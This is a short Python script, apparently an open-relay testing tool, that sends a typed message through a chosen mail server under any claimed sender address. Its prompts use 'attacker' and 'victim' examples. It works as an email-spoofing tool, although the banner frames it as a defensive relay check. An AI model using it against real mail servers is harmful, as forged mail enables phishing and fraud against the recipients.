#!/usr/bin/env python3

import smtplib
import sys

# Banner
print('''
   ____                         ____         __                 ______ __                 __      
  / __ \ ____   ___   ____     / __ \ ___   / /____ _ __  __   / ____// /_   ___   _____ / /__    
 / / / // __ \ / _ \ / __ \   / /_/ // _ \ / // __ `// / / /  / /    / __ \ / _ \ / ___// //_/    
/ /_/ // /_/ //  __// / / /  / _, _//  __// // /_/ // /_/ /  / /___ / / / //  __// /__ / ,<       
\____// .___/ \___//_/ /_/  /_/ |_| \___//_/ \__,_/ \__, /   \____//_/ /_/ \___/ \___//_/|_|      
     /_/                                           /____/                                         
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______
/_____//_____//_____//_____//_____//_____//_____//_____//_____//_____//_____//_____//_____//_____/
    ______                   _  __   _____                       ____ _                           
   / ____/____ ___   ____ _ (_)/ /  / ___/ ____   ____   ____   / __/(_)____   ____ _             
  / __/  / __ `__ \ / __ `// // /   \__ \ / __ \ / __ \ / __ \ / /_ / // __ \ / __ `/    --Astra On CyberSecurity--         
 / /___ / / / / / // /_/ // // /   ___/ // /_/ // /_/ // /_/ // __// // / / // /_/ /              
/_____//_/ /_/ /_/ \__,_//_//_/   /____// .___/ \____/ \____//_/  /_//_/ /_/ \__, /               
                                       /_/                                  /____/ 
Beware ! Publicly available email servers can be used for spoofing attack.
Ensure your mail server is not configured with OPEN RELAY to prevent email spoofing.
''')

# Function to prompt user input
def prompt(prompt_text):
    try:
        return input(prompt_text).strip()
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user.")
        sys.exit(1)

# Collect user inputs
fromaddr = prompt("From address (e.g., attacker@example.com): ")
toaddrs = prompt("To address (e.g., victim@example.com): ").split(',')
server_address = prompt("Mail server (e.g., smtp.example.com): ")

print("\nEnter the message. Press Ctrl+D (Unix) or Ctrl+Z (Windows) then Enter to send:\n")

# Compose the email
msg = f"From: {fromaddr}\r\nTo: {', '.join(toaddrs)}\r\n\r\n"
try:
    while True:
        line = input()
        msg += line + '\n'
except EOFError:
    pass

print(f"\n[+] Your message is ready to be sent ({len(msg)} bytes).")

# Send the email
try:
    with smtplib.SMTP(server_address) as server:
        server.set_debuglevel(1)  # Optional: Set to 1 for verbose output, 0 to disable
        server.sendmail(fromaddr, toaddrs, msg)
        print("[+] Message sent successfully!")
except smtplib.SMTPException as e:
    print(f"[!] Failed to send email: {e}")
except Exception as e:
    print(f"[!] An unexpected error occurred: {e}")
